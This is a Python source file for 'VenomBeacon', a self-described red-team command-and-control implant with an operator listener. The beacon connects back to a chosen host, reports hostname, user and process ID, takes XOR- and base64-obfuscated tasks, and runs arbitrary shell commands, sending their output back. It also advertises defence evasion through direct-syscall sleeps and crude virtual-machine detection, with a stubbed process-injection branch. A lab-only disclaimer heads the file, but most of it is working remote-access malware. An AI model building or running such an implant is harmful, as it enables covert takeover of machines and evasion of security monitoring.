#!/usr/bin/env python3
# VenomBeacon.py - Memory-Resident Red Team Beacon (2026 EDR Bypass Edition)
# sleep obfuscation, direct syscalls, hollowing
# EPO - Educational/Lab/Explicit Permission ONLY! No unauthorized use 


import socket
import subprocess
import os
import sys
import time
import random
import base64
import ctypes
import ctypes.wintypes as wintypes
import datetime
import platform
import struct
from threading import Thread

# ================= RED TEAM CONFIG =================
DEFAULT_SLEEP_MIN = 8
DEFAULT_SLEEP_MAX = 35
DEFAULT_JITTER = 0.45
DEFAULT_C2_PORT = 8443
XOR_KEY = 0x5A4D3C2B  # Simple XOR for task obfuscation

kernel32 = ctypes.windll.kernel32
ntdll = ctypes.windll.ntdll

# Syscall numbers (Windows 11 23H2/24H2 - verify on target!)
NT_DELAY_EXECUTION = 0x34

class LARGE_INTEGER(ctypes.Union):
    _fields_ = [("QuadPart", ctypes.c_longlong)]

# ================= UTILITY FUNCTIONS =================
def current_timestamp():
    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def xor_encrypt_decrypt(data: bytes, key: int) -> bytes:
    return bytes(b ^ (key & 0xFF) for b in data)

def is_vm():
    """Basic VM/sandbox detection (CPUID + timing)"""
    try:
        # CPUID check (VMware/VirtualBox signatures)
        eax, ebx, ecx, edx = ctypes.c_uint(), ctypes.c_uint(), ctypes.c_uint(), ctypes.c_uint()
        ctypes.windll.kernel32.GetNativeSystemInfo(ctypes.byref(ctypes.c_void_p()))
        # Simplified - real ops use more
        return "VMware" in platform.uname().node or "Virtual" in platform.node()
    except:
        return False

# ================= DIRECT SYSCALL SLEEP OBFUSCATION =================
def nt_delay_execution(delay_ms: int):
    """Use NtDelayExecution to sleep (bypass userland timers)"""
    delay = LARGE_INTEGER()
    delay.QuadPart = - (delay_ms * 10000)  # Negative = relative
    status = ntdll.NtDelayExecution(False, ctypes.byref(delay))
    return status == 0

# ================= BEACON CORE LOGIC =================
def beacon_connect(c2_host: str, c2_port: int, jitter: float):
    """Main beacon loop - low-noise connect-back with sleep obfuscation"""
    backoff = DEFAULT_SLEEP_MIN
    attempt = 0

    print(f"[{current_timestamp()}] VenomBeacon starting → C2: {c2_host}:{c2_port}")

    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((c2_host, c2_port))
            print(f"[{current_timestamp()}] Connected to C2")

            # Send beacon ident + VM detect
            ident = f"ID:{platform.node()}|USER:{os.getlogin()}|VM:{is_vm()}|PID:{os.getpid()}"
            s.send(ident.encode())

            while True:
                try:
                    task = s.recv(4096).decode(errors='ignore').strip()
                    if not task:
                        break

                    # Decrypt task (simple XOR)
                    task_bytes = base64.b64decode(task)
                    task = xor_encrypt_decrypt(task_bytes, XOR_KEY).decode()

                    if task == "die":
                        s.send(b"[*] Beacon terminating\n")
                        return

                    # Execute task
                    if task.startswith("exec:"):
                        cmd = task[5:]
                        try:
                            out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=30)
                            s.send(out)
                        except Exception as e:
                            s.send(str(e).encode())

                    elif task.startswith("inject:"):
                        # Placeholder for hollowing (expand later)
                        s.send(b"[*] Injection stub ready - shellcode needed\n")

                    elif task == "sleep":
                        sleep_time = random.randint(DEFAULT_SLEEP_MIN, DEFAULT_SLEEP_MAX)
                        jittered = int(sleep_time * (1 + random.uniform(-jitter, jitter)))
                        print(f"[{current_timestamp()}] Sleeping {jittered}s (obfuscated)")
                        nt_delay_execution(jittered * 1000)  # ms

                except socket.timeout:
                    continue

            s.close()

        except Exception as e:
            print(f"[{current_timestamp()}] Connect failed: {e}")
            backoff = min(backoff * 2, 600)
            jittered = int(backoff * (1 + random.uniform(-jitter, jitter)))
            time.sleep(jittered)

# ================= OPERATOR LISTENER =================
def operator_listener(host: str, port: int):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(5)
    print(f"[{current_timestamp()}] C2 listening on {host}:{port}")

    while True:
        client, addr = server.accept()
        print(f"[{current_timestamp()}] New beacon from {addr}")

        Thread(target=lambda: handle_client(client, addr)).start()

def handle_client(client, addr):
    while True:
        task = input(f"[{addr}] Task> ").strip()
        if task.lower() == "exit":
            client.send(b"die")
            break

        # Encrypt & send
        task_bytes = xor_encrypt_decrypt(task.encode(), XOR_KEY)
        encoded = base64.b64encode(task_bytes).decode()
        client.send(encoded.encode())

        try:
            resp = client.recv(8192).decode(errors='ignore')
            print(resp)
        except:
            break

    client.close()

# ================= MAIN ENTRY =================
if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage:")
        print("  python VenomBeacon.py listener <host> <port>")
        print("  python VenomBeacon.py beacon <host> <port> [--jitter 0.5]")
        sys.exit(1)

    mode = sys.argv[1].lower()

    if mode == "listener":
        operator_listener(sys.argv[2], int(sys.argv[3]))
    elif mode == "beacon":
        jitter = float(sys.argv[5]) if len(sys.argv) > 5 and sys.argv[4] == "--jitter" else DEFAULT_JITTER
        beacon_connect(sys.argv[2], int(sys.argv[3]), jitter)
    else:
        print("Invalid mode")